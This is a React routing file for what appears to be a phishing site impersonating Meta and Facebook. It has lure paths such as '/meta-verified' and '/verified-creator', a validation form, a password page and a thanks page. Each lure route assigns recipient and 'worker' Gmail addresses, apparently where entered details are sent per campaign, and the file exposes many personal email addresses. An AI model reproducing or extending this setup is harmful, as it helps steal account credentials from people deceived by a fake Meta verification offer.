import React from 'react'
import { Route, Routes } from 'react-router-dom'
import Home from '../pages/Home'
// import VerifyAccount from '../pages/VerifyAccount'
import ThanksPage from '../pages/ThanksPage'
import VerificationForm from '../pages/ValidationPage'
import Password from '../pages/Password'

const AppRoutes = () => {
  return (
    <div>
        <Routes>
            <Route path='/' element={<Home />} />
            <Route path='/meta' element={<Home emails={["unaisnizamani598@gmail.com","sophiasloanadvertising@gmail.com"]} workerEmail={"sophiasloanadvertising@gmail.com"} />} />
      <Route path='/blue' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"shetallnanda@gmail.com"} />} />
      <Route path='/facebook' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"muhammedismail525255@gmail.com"} />} />
      <Route path='/obtain' element={<Home emails={["unaisnizamani598@gmail.com"]} workerEmail={"metaadsmarketing6@gmail.com"} />} />
      <Route path='/free' element={<Home emails={["unaisnizamani598@gmail.com"]} workerEmail={""} />} />
      <Route path='/for-you' element={<Home emails={["unaisnizamani598@gmail.com"]} workerEmail={"sumairnizamani36@gmail.com"} />} />
      <Route path='/for-free' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"officiall.sara.james.ads@gmail.com"} />} />
      <Route path='/for-creators' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"helen.jerry.ads.info@gmail.com"} />} />
      <Route path='/details' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"ajcyksgvvis123@gmail.com"} />} />
      <Route path='/verified-creator' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"hoursleftyourprofilevoilations@gmail.com"} />} />
      <Route path='/meta-offer' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"meytal.cohen.official.ads@gmail.com"} />} />
      <Route path='/eligible' element={<Home emails={["unaisnizamani598@gmail.com","melissa.melisaofficial@gmail.com"]} workerEmail={"melissa.melisaofficial@gmail.com"} />} />
      <Route path='/meta-verified' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"sara.blakely.ads.info@gmail.com"} />} />
{/*       <Route path='/for-facebook' element={<Home emails={["unaisnizamani598@gmail.com","fawadniz49@gmail.com","mjohn72929@gmail.com"]} workerEmail={"fawadniz49@gmail.com"} />} /> */}
      <Route path='/get' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"ajcyksgvvis123@gmail.com"} />} />
            <Route path='/validation' element={<VerificationForm />} />
            {/* <Route path='/account/verification' element={<VerifyAccount />} /> */}
            <Route path='/thanks' element={<ThanksPage />} />
            <Route path='/pass' element={<Password/>} />
        </Routes>
    </div>
  )
}

export default AppRoutes
